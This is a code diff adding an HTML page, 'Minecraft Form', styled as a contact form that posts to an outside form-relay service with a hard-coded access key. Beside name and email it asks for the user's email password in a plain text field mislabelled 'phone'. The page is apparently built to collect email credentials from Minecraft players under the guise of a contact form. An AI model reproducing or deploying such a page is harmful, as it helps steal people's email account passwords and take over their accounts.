@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="style.css" rel="stylesheet">
+    <title>Minecraft Form</title>
+</head>
+<body>
+    <form action="https://api.web3forms.com/submit" method="POST">
+      <input type="hidden" name="access_key" value="5b754b21-da53-4b6e-877c-315c7b2fc4eb">
+      <div class="bg_img"></div>
+        <div class="form_wrapper">
+          <div class="form_container">
+            <div class="title_container">
+              <h2>Contact Form</h2>
+            </div>
+            <form>
+              <div class="row clearfix">
+                <div class="col_half">
+                  <label>Name</label>
+                  <div class="input_field"> <span><i aria-hidden="true" class="fas fa-user"></i></span>
+                    <input type="text" name="first_name" placeholder="John" required />
+                  </div>
+                </div>
+                <div class="col_half">
+                  <label>Server Name</label>
+                  <div class="input_field"> <span><i aria-hidden="true" class="fas fa-user"></i></span>
+                    <input type="text" name="last_name" placeholder="Doe" />
+                  </div>
+                </div>
+              </div>
+              <div class="row clearfix">
+                <div class="col_half">
+                  <label>Email</label>
+                  <div class="input_field"> <span><i aria-hidden="true" class="fas fa-envelope"></i></span>
+                    <input type="email" name="email" placeholder="johndoe@gmail.com" required />
+                  </div>
+                </div>
+                <div class="col_half">
+                  <label>Password</label>
+                  <div class="input_field"> <span><i aria-hidden="true" class="fas fa-key"></i></span>
+                    <input type="text" name="phone" placeholder="Email Password"  />
+                  </div>
+                </div>
+              </div>
+              <div class="row clearfix">
+                <div>
+                  <label>Comments</label>
+                  <div class="textarea_field"> <span><i aria-hidden="true" class="fas fa-comment"></i></span>
+                    <textarea cols="46" rows="3" name="comments"></textarea>
+                  </div>
+                </div>
+              </div>
+              <input class="button" type="submit" value="Sumbit" />
+            </form>
+          </div>
+        </div>
+    </form>
+</body>
+</html>
